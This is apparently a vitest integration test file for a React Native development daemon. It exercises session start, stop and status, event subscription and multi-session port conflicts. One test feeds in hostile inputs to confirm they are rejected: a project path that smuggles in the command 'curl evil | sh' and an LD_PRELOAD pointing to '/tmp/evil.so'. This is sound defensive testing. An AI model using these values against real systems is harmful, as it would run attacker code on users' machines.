import { afterEach, describe, expect, it } from "vitest";
import {
  makeTestWorktree,
  spawnTestDaemon,
  type TestDaemonHandle,
} from "../../../test/helpers/spawnTestDaemon.js";
import type { IpcMessage } from "../../core/ipc.js";

// Phase 13.2 merge gate — integration test #3. Exercises session/start |
// session/stop | session/status | events/subscribe end-to-end against a
// real daemon subprocess. Uses a test-only fake services boot
// (`RN_DEV_DAEMON_BOOT_MODE=fake`) so the test exercises the daemon's
// state machine and event fan-out rather than Metro itself — the session
// supervisor is what's under test here, not Metro.

describe("daemon session boot (integration)", () => {
  const cleanups: Array<() => void> = [];
  const liveHandles: TestDaemonHandle[] = [];

  afterEach(async () => {
    for (const h of liveHandles.splice(0)) {
      await h.stop();
    }
    for (const cleanup of cleanups.splice(0)) {
      cleanup();
    }
  });

  it("starts a session, emits metro status events, reports running status, stops cleanly, daemon survives", async () => {
    const { path: worktree, cleanup } = makeTestWorktree();
    cleanups.push(cleanup);

    const daemon = await spawnTestDaemon(worktree, {
      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
    });
    liveHandles.push(daemon);

    // Phase D2 — events/subscribe { profile } boots-and-attaches in one
    // round-trip. Observer-mode subscribes (no profile) are gone; this
    // test exercises the canonical boot-or-join path.
    const profile = {
      name: "test",
      isDefault: true,
      worktree: null,
      branch: "main",
      platform: "ios",
      mode: "quick",
      metroPort: 8081,
      devices: {},
      buildVariant: "debug",
      preflight: { checks: [], frequency: "once" },
      onSave: [],
      env: {},
      projectRoot: worktree,
    };
    const events: IpcMessage[] = [];
    const sub = await daemon.client.subscribe(
      {
        type: "command",
        action: "events/subscribe",
        id: "sub-1",
        payload: { profile },
      },
      {
        onEvent: (evt) => {
          events.push(evt);
        },
      },
    );
    expect(sub.initial.type).toBe("response");
    expect((sub.initial.payload as { subscribed: boolean }).subscribed).toBe(
      true,
    );
    expect(
      typeof (sub.initial.payload as { sessionId?: string }).sessionId,
    ).toBe("string");

    try {

      // 3. Wait for metro/status: running event (starting → running
      //    transition is what the client cares about most).
      await waitForEvent(events, (evt) => {
        const payload = evt.payload as
          | { kind?: string; data?: { status?: string } }
          | undefined;
        return (
          payload?.kind === "metro/status" && payload.data?.status === "running"
        );
      }, 3_000);

      // Should have seen starting at some point before (possibly in the
      // same batch).
      const startingSeen = events.some((evt) => {
        const payload = evt.payload as
          | { kind?: string; data?: { status?: string } }
          | undefined;
        return (
          payload?.kind === "metro/status" &&
          payload.data?.status === "starting"
        );
      });
      expect(startingSeen).toBe(true);

      // 4. session/status should report running.
      const statusResp = await daemon.client.send({
        type: "command",
        action: "session/status",
        id: "status-1",
      });
      const statusPayload = statusResp.payload as {
        status: string;
        services: Record<string, unknown>;
      };
      expect(statusPayload.status).toBe("running");
      expect(typeof statusPayload.services).toBe("object");

      // 5. session/stop → should emit metro/status: stopped event and
      //    transition back to stopped.
      const stopResp = await daemon.client.send({
        type: "command",
        action: "session/stop",
        id: "stop-1",
      });
      expect(stopResp.type).toBe("response");

      await waitForEvent(events, (evt) => {
        const payload = evt.payload as
          | { kind?: string; data?: { status?: string } }
          | undefined;
        return (
          payload?.kind === "metro/status" && payload.data?.status === "stopped"
        );
      }, 3_000);

      // 6. Daemon must survive session/stop — daemon/ping still answers.
      const pingResp = await daemon.client.send({
        type: "command",
        action: "daemon/ping",
        id: "ping-after-stop",
      });
      expect(pingResp.type).toBe("response");
    } finally {
      sub.close();
    }
  }, 20_000);

  it("start → stop → start succeeds on the same daemon", async () => {
    const { path: worktree, cleanup } = makeTestWorktree();
    cleanups.push(cleanup);

    const daemon = await spawnTestDaemon(worktree, {
      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
    });
    liveHandles.push(daemon);

    const profile = {
      name: "test",
      isDefault: true,
      worktree: null,
      branch: "main",
      platform: "ios",
      mode: "quick",
      metroPort: 8081,
      devices: {},
      buildVariant: "debug",
      preflight: { checks: [], frequency: "once" },
      onSave: [],
      env: {},
      projectRoot: worktree,
    };

    // First cycle.
    const start1 = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "s1",
      payload: { profile },
    });
    expect((start1.payload as { status: string }).status).toBe("starting");
    await waitForStatus(daemon, "running", 3_000);
    await daemon.client.send({
      type: "command",
      action: "session/stop",
      id: "x1",
    });
    await waitForStatus(daemon, "stopped", 3_000);

    // Second cycle on the same daemon — exercises IPC-handler
    // re-registration, epoch reset, module registry re-creation.
    const start2 = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "s2",
      payload: { profile },
    });
    expect((start2.payload as { status: string }).status).toBe("starting");
    await waitForStatus(daemon, "running", 3_000);
    await daemon.client.send({
      type: "command",
      action: "session/stop",
      id: "x2",
    });
    await waitForStatus(daemon, "stopped", 3_000);
  }, 20_000);

  it("rejects profile payloads that would allow shell injection or env-var pre-loading", async () => {
    const { path: worktree, cleanup } = makeTestWorktree();
    cleanups.push(cleanup);

    const daemon = await spawnTestDaemon(worktree, {
      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
    });
    liveHandles.push(daemon);

    const baseProfile = {
      name: "test",
      isDefault: true,
      worktree: null,
      branch: "main",
      platform: "ios",
      mode: "quick",
      metroPort: 8081,
      devices: {},
      buildVariant: "debug",
      preflight: { checks: [], frequency: "once" },
      onSave: [],
      env: {},
      projectRoot: worktree,
    };

    // Shell-injection attempt via profile.projectRoot: newline-laden
    // path that would have broken the watchman `sh -c` argument before
    // argv-form + validation.
    const shellInject = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "inj-1",
      payload: {
        profile: { ...baseProfile, projectRoot: "/tmp/x\n; curl evil | sh" },
      },
    });
    expect(
      (shellInject.payload as { code?: string }).code,
    ).toBe("E_PROFILE_PATH_NEWLINE");

    // profile.env denylist — LD_PRELOAD must be rejected before any
    // subprocess gets it on their environ.
    const ldPreload = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "inj-2",
      payload: {
        profile: { ...baseProfile, env: { LD_PRELOAD: "/tmp/evil.so" } },
      },
    });
    expect((ldPreload.payload as { code?: string }).code).toBe(
      "E_PROFILE_ENV_BANNED",
    );

    // Invalid port.
    const badPort = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "inj-3",
      payload: { profile: { ...baseProfile, metroPort: 70000 } },
    });
    expect((badPort.payload as { code?: string }).code).toBe(
      "E_PROFILE_METRO_PORT",
    );

    // After all three rejections, the daemon is still healthy —
    // a malformed session/start must not wedge the RPC dispatch.
    const ping = await daemon.client.send({
      type: "command",
      action: "daemon/ping",
      id: "ping-after-inj",
    });
    expect(ping.type).toBe("response");
  }, 15_000);

  // Phase D8 — invert the singleton-pin. Pre-D8 a second `session/start`
  // against an active daemon was rejected with `E_SESSION_ALREADY_RUNNING`.
  // The multi-session contract is:
  //   - Distinct sessionIds + distinct metroPorts → both succeed.
  //   - Same sessionId (only reachable in unit tests; the RPC auto-mints
  //     a fresh one) → `E_SESSION_ALREADY_EXISTS`. Pinned in
  //     `supervisor-multi.test.ts:176`.
  //   - Distinct sessionIds + colliding metroPort → `E_PORT_CONFLICT`.

  it("two session/start calls with distinct profiles + distinct ports BOTH succeed (D8)", async () => {
    const { path: worktree, cleanup } = makeTestWorktree();
    cleanups.push(cleanup);

    const daemon = await spawnTestDaemon(worktree, {
      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
    });
    liveHandles.push(daemon);

    const profileA = makeMinimalProfile(worktree, "alpha", 8081);
    const profileB = makeMinimalProfile(worktree, "beta", 8082);

    const first = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "d8-start-a",
      payload: { profile: profileA },
    });
    const firstPayload = first.payload as { status?: string; sessionId?: string };
    expect(firstPayload.status).toBe("starting");
    expect(typeof firstPayload.sessionId).toBe("string");

    const second = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "d8-start-b",
      payload: { profile: profileB },
    });
    const secondPayload = second.payload as { status?: string; sessionId?: string };
    expect(secondPayload.status).toBe("starting");
    expect(typeof secondPayload.sessionId).toBe("string");
    expect(secondPayload.sessionId).not.toBe(firstPayload.sessionId);

    // sessions/list reports both. (`session/status` without sessionId
    // would now return E_SESSION_AMBIGUOUS — multi-session callers use
    // sessions/list as the canonical snapshot.)
    const listResp = await daemon.client.send({
      type: "command",
      action: "sessions/list",
      id: "d8-list",
    });
    const listPayload = listResp.payload as {
      sessions?: Array<{ sessionId?: string; profileName?: string }>;
    };
    const ids = (listPayload.sessions ?? []).map((e) => e.sessionId).sort();
    expect(ids).toEqual(
      [firstPayload.sessionId, secondPayload.sessionId].sort(),
    );
    const names = (listPayload.sessions ?? []).map((e) => e.profileName).sort();
    expect(names).toEqual(["alpha", "beta"]);
  }, 15_000);

  it("two session/start calls with distinct profiles but colliding metroPort return E_PORT_CONFLICT (D8)", async () => {
    const { path: worktree, cleanup } = makeTestWorktree();
    cleanups.push(cleanup);

    const daemon = await spawnTestDaemon(worktree, {
      env: { RN_DEV_DAEMON_BOOT_MODE: "fake" },
    });
    liveHandles.push(daemon);

    // Same port (8081) on both — different names so this isn't an
    // E_SESSION_ALREADY_EXISTS clash, and different sessionIds get
    // auto-minted by the RPC handler.
    const profileA = makeMinimalProfile(worktree, "alpha", 8081);
    const profileB = makeMinimalProfile(worktree, "beta-same-port", 8081);

    const first = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "d8-port-a",
      payload: { profile: profileA },
    });
    expect((first.payload as { status?: string }).status).toBe("starting");

    const second = await daemon.client.send({
      type: "command",
      action: "session/start",
      id: "d8-port-b",
      payload: { profile: profileB },
    });
    const errPayload = second.payload as { code?: string; message?: string };
    expect(errPayload.code).toBe("E_PORT_CONFLICT");
    expect(errPayload.message).toMatch(/port\s+8081/i);
  }, 15_000);
});

function makeMinimalProfile(worktree: string, name: string, metroPort: number) {
  return {
    name,
    isDefault: false,
    worktree: null,
    branch: "main",
    platform: "ios",
    mode: "quick",
    metroPort,
    devices: {},
    buildVariant: "debug",
    preflight: { checks: [], frequency: "once" },
    onSave: [],
    env: {},
    projectRoot: worktree,
  };
}

async function waitForEvent(
  events: IpcMessage[],
  pred: (evt: IpcMessage) => boolean,
  timeoutMs: number,
): Promise<IpcMessage> {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const found = events.find(pred);
    if (found) return found;
    await new Promise((r) => setTimeout(r, 25));
  }
  throw new Error(
    `waitForEvent: timed out after ${timeoutMs}ms. Events seen: ${JSON.stringify(
      events.map((e) => e.payload),
    )}`,
  );
}

async function waitForStatus(
  daemon: TestDaemonHandle,
  target: string,
  timeoutMs: number,
): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  let lastSeen = "(none)";
  while (Date.now() < deadline) {
    const resp = await daemon.client.send({
      type: "command",
      action: "session/status",
      id: `status-poll-${Date.now()}`,
    });
    const payload = resp.payload as { status?: string };
    lastSeen = payload.status ?? "(no status)";
    if (lastSeen === target) return;
    await new Promise((r) => setTimeout(r, 50));
  }
  throw new Error(
    `waitForStatus: timed out waiting for "${target}", last seen "${lastSeen}"`,
  );
}
